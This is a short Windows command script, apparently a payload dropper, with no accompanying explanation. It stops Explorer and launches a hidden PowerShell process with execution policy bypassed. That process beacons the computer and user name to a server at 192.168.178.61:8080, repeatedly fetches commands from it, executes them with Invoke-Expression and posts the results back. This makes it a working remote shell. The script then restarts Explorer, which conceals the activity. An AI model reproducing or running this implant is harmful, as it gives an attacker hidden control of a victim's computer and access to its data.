cd C:\Windows\System32

taskkill /f /IM Explorer.exe

start powershell.exe -Executionpolicy Bypass -Command "Start-Process $PSHOME\powershell.exe -ArgumentList {$s='192.168.178.61:8080';$i='dae63033-2809630e-d97f51ac';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/dae63033/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/2809630e -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/d97f51ac -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden"

timeout 6

start Explorer.exe
